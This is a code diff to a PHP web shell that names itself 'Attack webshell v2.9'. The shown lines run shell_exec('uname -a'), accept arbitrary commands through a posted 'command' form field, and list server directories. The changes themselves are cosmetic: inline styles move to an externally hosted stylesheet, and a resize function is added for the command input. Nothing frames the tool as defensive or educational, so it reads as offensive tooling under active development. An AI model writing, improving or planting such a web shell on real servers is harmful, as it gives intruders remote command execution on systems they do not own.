@@ -1,5 +1,5 @@
 <?php
-define('SCRIPT_NAME', 'Attack webshell v2.8');
+define('SCRIPT_NAME', 'Attack webshell v2.9');
 
 $current_directory = getcwd();
 $current_device = shell_exec('uname -a');
@@ -98,35 +98,8 @@ $directory_contents = getDirectoryContents($current_directory);
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title><?php echo htmlspecialchars(SCRIPT_NAME); ?></title>
-<style>
-body {
-	font-family: Arial, sans-serif;
-	background-color: #121212;
-	color: #e0e0e0;
-}
-.directory-path form { display: inline; }
-.directory-path input[type="submit"] {
-	background: none;
-	border: none;
-	color: #bb86fc;
-	cursor: pointer;
-	text-decoration: underline;
-}
-table { width: 100%; border-collapse: collapse; }
-th, td { padding: 8px; text-align: left; border: 1px solid #333; }
-th { background-color: #333; }
-tr:nth-child(even) { background-color: #1e1e1e; }
-tr:hover { background-color: #333; }
-textarea { width: 100%; height: 150px; background-color: #333; color: #e0e0e0; border: 1px solid #555; }
-input, button {
-	background-color: #333;
-	color: #e0e0e0;
-	border: 1px solid #555;
-	padding: 5px;
-}
-button { cursor: pointer; }
-h1, h3 { color: #bb86fc; }
-</style>
+<!--link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/JennyBlackburn/webshell/refs/heads/main/style.css"-->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JennyBlackburn/webshell@main/style.css">
 </head>
 <body>
 <h1><?php echo htmlspecialchars(SCRIPT_NAME); ?></h1>
@@ -139,7 +112,8 @@ h1, h3 { color: #bb86fc; }
 <br>
 
 <form method="post">
-<input type="text" name="command" placeholder="Enter command" autofocus autocomplete="off">
+<!--input type="text" name="command" placeholder="Enter command" autofocus autocomplete="off"-->
+<input type="text" name="command" id="commandInput" placeholder="Enter command" autofocus autocomplete="off" oninput="resizeInput(this)">
 <input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory); ?>">
 <button type="submit">Execute</button>
 </form>
@@ -187,30 +161,6 @@ h1, h3 { color: #bb86fc; }
 <?php endforeach; ?>
 </tbody>
 </table>
-<style>
-/* Style buttons to look like links */
-.link-text {
-	background: none;
-	border: none;
-	color: #bb86fc;
-	/*text-decoration: underline;*/
-	cursor: pointer;
-	font-size: inherit;
-	font-family: inherit;
-	padding: 0;
-	margin: 0;
-}
-
-/* Remove focus outline for better aesthetics */
-.link-text:focus {
-	outline: none;
-}
-
-/* Optional: Change color when hovered over */
-.link-text:hover {
-	color: purple;
-}
-</style>
 <script>
 function sortTable(n) {
   var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
@@ -266,6 +216,12 @@ function sortTable(n) {
     }
   }
 }
+function resizeInput(el) {
+    // Set width to auto so it can resize dynamically
+    el.style.width = 'auto';
+    // Set width to the scrollWidth (total width of the content)
+    el.style.width = (el.scrollWidth + 10) + 'px'; // Add a bit of padding
+  }
 </script>
 </body>
 </html>
